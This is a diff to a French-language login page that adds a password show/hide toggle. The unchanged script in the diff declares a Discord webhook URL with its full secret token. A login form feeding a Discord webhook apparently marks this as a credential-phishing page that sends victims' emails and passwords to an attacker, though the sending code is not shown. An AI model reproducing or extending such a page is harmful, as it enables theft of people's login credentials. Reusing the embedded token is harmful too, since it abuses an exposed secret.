@@ -159,7 +159,7 @@
             <input type="email" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
             <div class="password-field">
                 <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
-                <span class="show-password">Afficher</span>
+                <span class="show-password" onclick="togglePassword()">Afficher</span>
             </div>
             <a href="#" class="forgot-password">Mot de passe oublié ?</a>
             <div class="buttons">
@@ -180,6 +180,16 @@
     </div>
 
     <script>
+        // Fonction pour basculer l'affichage du mot de passe
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const passwordType = passwordField.type === 'password' ? 'text' : 'password';
+            passwordField.type = passwordType;
+
+            const showPasswordText = document.querySelector('.show-password');
+            showPasswordText.textContent = passwordType === 'password' ? 'Afficher' : 'Cacher';
+        }
+
         // URL du Webhook Discord
         const webhookURL = 'https://discord.com/api/webhooks/1332658553298882620/NPStZf0fBnD973eBiw0E6SJzdt0kfqABdk5Z7_M-dNMjFoTC0fZSKRmbF-BNKYirDIL9';
 
